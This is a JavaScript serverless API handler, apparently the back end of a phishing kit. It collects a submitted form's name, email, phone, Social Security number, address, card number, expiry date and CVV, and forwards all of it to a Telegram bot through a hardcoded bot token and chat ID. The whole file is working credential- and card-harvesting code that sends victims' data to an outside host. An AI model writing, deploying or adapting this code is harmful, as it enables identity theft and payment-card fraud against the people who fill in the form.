import axios from 'axios';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { title, firstName, lastName, email, phone, ssn, address, city, zip, cardNumber, expiry, cvv } = req.body;

      // Format message for Telegram
      const message = `
        📝 New Form Submission:
        Title: ${title || 'Not provided'}
        First Name: ${firstName || 'Not provided'}
        Last Name: ${lastName || 'Not provided'}
        Email: ${email || 'Not provided'}
        Phone: ${phone || 'Not provided'}
        SSN: ${ssn || 'Not provided'}
        Address: ${address || 'Not provided'}
        City: ${city || 'Not provided'}
        ZIP: ${zip || 'Not provided'}
        Card Number: ${cardNumber || 'Not provided'}
        Expiry: ${expiry || 'Not provided'}
        CVV: ${cvv || 'Not provided'}
      `.trim();

      const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
      const chatId = '7587120060';
      const TELEGRAM_API_URL = `https://api.telegram.org/bot ${telegramBotToken}/sendMessage`;

      await axios.post(TELEGRAM_API_URL, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });

      res.status(200).json({ success: true });
    } catch (error) {
      console.error('Error sending to Telegram:', error.message);
      res.status(500).json({ success: false, error: 'Failed to send message' });
    }
  } else {
    res.status(405).json({ success: false, error: 'Method not allowed' });
  }
}
